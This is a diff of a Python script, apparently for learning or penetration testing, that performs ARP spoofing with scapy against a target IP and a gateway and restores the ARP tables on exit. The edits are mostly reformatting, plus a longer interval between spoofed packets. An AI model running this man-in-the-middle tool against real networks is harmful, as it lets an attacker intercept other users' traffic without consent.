@@ -38,16 +38,21 @@ def getArgs() -> argparse.Namespace:
     """
     parser = argparse.ArgumentParser()          # Creating the parser object
     # Adding the arguments
-    parser.add_argument("-t", "--target", dest="target", help="Target IP / IP Range.", required=True)
-    parser.add_argument("-g", "--gateway", dest="gateway", help="Gateway IP.", required=True)
+    parser.add_argument("-t", "--target", dest="target",
+                        help="Target IP / IP Range.", required=True)
+    parser.add_argument("-g", "--gateway", dest="gateway",
+                        help="Gateway IP.", required=True)
     options = parser.parse_args()               # Parsing the arguments
     # Checking if the arguments are valid
     if not options.target:
-        parser.error("\033[91m[-] Please specify a target IP\n\033[93mUse --help for more info.\033[0m")
+        parser.error(
+            "\033[91m[-] Please specify a target IP\n\033[93mUse --help for more info.\033[0m")
     elif not options.gateway:
-        parser.error("\033[91m[-] Please specify a gateway IP\n\033[93mUse --help for more info.\033[0m")
+        parser.error(
+            "\033[91m[-] Please specify a gateway IP\n\033[93mUse --help for more info.\033[0m")
     if options.target == options.gateway:
-        parser.error("\033[91m[-] The target IP and the gateway IP cannot be the same.\033[0m")
+        parser.error(
+            "\033[91m[-] The target IP and the gateway IP cannot be the same.\033[0m")
     # Returning the arguments if they are valid
     return options
 
@@ -66,12 +71,18 @@ def getMAC(ip):
         None
     """
     resultList = []                                                         # Creating an empty list
-    arpRequest = scapy.ARP(pdst=ip)                                         # Creating an ARP request object
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")                        # Creating an Ethernet frame object
-    arpBroadcast = broadcast/arpRequest                                     # Combining the ARP request and the Ethernet frame
-    while len(resultList) == 0:                                             # Checking if the list is empty, and if it is, keep sending the packet
-        resultList = scapy.srp(arpBroadcast, timeout=2, verbose=False)[0]   # Sending the packet and storing the response in the list
-    return resultList[0][1].hwsrc                                           # Returning the MAC address extracted from the response
+    # Creating an ARP request object
+    arpRequest = scapy.ARP(pdst=ip)
+    # Creating an Ethernet frame object
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    # Combining the ARP request and the Ethernet frame
+    arpBroadcast = broadcast/arpRequest
+    # Checking if the list is empty, and if it is, keep sending the packet
+    while len(resultList) == 0:
+        # Sending the packet and storing the response in the list
+        resultList = scapy.srp(arpBroadcast, timeout=2, verbose=False)[0]
+    # Returning the MAC address extracted from the response
+    return resultList[0][1].hwsrc
 
 
 def spoof(targetIP, spoofIP, targetMAC):
@@ -111,11 +122,18 @@ def restore(destinationIP, sourceIP):
     # Similar to the spoof function, but with the destination and source IP addresses swapped to the original values
     destinationMAC = getMAC(destinationIP)
     sourceMAC = getMAC(sourceIP)
-    packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=destinationMAC, psrc=sourceIP, hwsrc=sourceMAC)
+    packet = scapy.ARP(op=2,
+                       pdst=destinationIP,
+                       hwdst=destinationMAC,
+                       psrc=sourceIP,
+                       hwsrc=sourceMAC)
     scapy.send(packet, count=4, verbose=False)
 
+
 # Loading animation
-loading = lambda i: print(f"\r|\033[48;5;51;38;5;0m{'>' * (i * 25 // 100)}\033[0m{' ' * (25 - (i * 25 // 100))}|", end="") or time.sleep(0.01)
+def loading(i):
+    return print(f"\r|\033[48;5;51;38;5;0m{'>' * (i * 25 // 100)}\033[0m{' ' * (25 - (i * 25 // 100))}|", end="") or time.sleep(0.01)
+
 
 def main():
     """
@@ -141,16 +159,19 @@ def main():
             spoof(gatewayIP, targetIP, gatewayMAC)
             packetsCount = packetsCount + 2
             macResetTimer = macResetTimer + 2
-            print(f"\r\033[92m[+] Packets sent:  {packetsCount}\033[0m", end="")
-            time.sleep(2)
+            print(
+                f"\r\033[92m[+] Packets sent:  {packetsCount}\033[0m", end="")
+            time.sleep(10)
     except KeyboardInterrupt:
-        print("\n\033[93m[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\033[0m")
+        print(
+            "\n\033[93m[-] Detected CTRL + C ... Resetting ARP tables ... Please wait.\033[0m")
         restore(targetIP, gatewayIP)
         restore(gatewayIP, targetIP)
         list(map(loading, range(101)))
         # os.system("service apache2 stop")    # Uncomment this line if you started the apache2 service at the beginning of the script
         print("\033[92m[+] ARP tables restored. Quitting.\033[0m")
         sys.exit(0)
+
 
 if __name__ == "__main__":
     main()
